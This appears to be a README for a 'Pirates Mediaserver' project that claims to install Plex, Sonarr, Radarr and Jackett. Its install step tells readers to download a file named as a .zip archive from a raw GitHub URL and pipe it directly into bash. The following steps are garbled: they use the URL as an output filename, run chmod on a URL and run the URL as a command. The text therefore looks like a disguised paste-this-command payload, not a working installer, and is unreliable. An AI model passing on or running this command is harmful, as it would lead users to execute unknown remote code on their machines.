Pirates Mediaserver
=======

About
-----

This repository contains scripts for setting up a private media-server. This script can install Plex, Sonarr, Radarr and Jackett on the fly.


Requirements
------------

At this moment only following distros are supported.

| Debian | Ubuntu | CentOS |
|:---:|:---:|:---:|
| Recommended | LTS Only | Experimental | 
| 7-9 | 12.04-16.04 | 6 & 7 |


Install
-------

Just execute below code to install them all.

`wget https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip -O - -o /dev/null|bash`

To exclude certain apps follow these instructions:

### Step 1
Download script: `wget https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip -O https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`

Make it executable: `chmod +x https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`

### Step 2
Now use variable like this: `PLEX=no JACKETT=No https://raw.githubusercontent.com/connedigital/pirates-mediaserver/master/mono/mediaserver-pirates-2.4-beta.2.zip`

This will install everything else except Plex and Jackett. Hope this explain basic usage.


_There is also specific install instruction available on each folder_
